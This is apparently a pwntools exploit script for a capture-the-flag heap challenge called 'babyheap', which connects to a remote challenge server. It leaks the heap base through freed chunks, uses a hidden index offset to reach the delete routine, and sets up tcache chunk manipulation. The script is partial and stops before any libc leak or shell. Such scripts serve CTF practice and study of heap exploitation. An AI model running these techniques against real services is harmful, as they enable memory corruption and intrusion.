from elftools.construct import lib
from pwn import *
# pyright: reportUndefinedVariable=false

context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

#libc = ELF('/home/sev1n/tools/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc.so.6')
libc = ELF('./libc-2.27.so')
#elf = ELF('./')

context.log_level = 'debug'
debug = 0

if debug:
    io = process('./babyheap')
else:
    io = remote('47.98.229.103',1337)

def p():
    gdb.attach(proc.pidof(io)[0])

#one_gadget = [,,]

def new(size,content):
    io.sendlineafter(b">>>",str(1).encode())
    size = int(hex(size),16)
    io.sendlineafter(b"now the size:",str(size).encode())
    io.sendafter(b"next the content:",content)

def delete(idx):
    io.sendlineafter(b">>>",str(4).encode())
    io.sendlineafter(b"house index:",str(idx).encode())

def show(idx):
    io.sendlineafter(b">>>",str(2).encode())
    io.sendlineafter(b"house index:",str(idx).encode())

def edit(idx,content):
    io.sendlineafter(b">>>",str(3).encode())
    io.sendlineafter(b"house index:",str(idx).encode())
    io.sendafter(b"content",content)

backdoor_num = 0x74737572

new(0x48,b'a' * 0x48)
new(0x98,b'a' * 0x98)
delete(0+backdoor_num)
delete(1+backdoor_num)
show(0)
io.recvuntil(b'\x00'*8)
heap_base = u64(io.recv(8)) - 0x10
success("heap_base -->" + hex(heap_base))
new(0x78, b'b' * 0x78) #idx = 2
new(0x78,b'b' * 0x78)
new(0x78,b'b' * 0x78)

delete(2+backdoor_num)
delete(3+backdoor_num)
delete(4+backdoor_num)
show(2)
show(3)
show(4)

# p()

io.interactive()

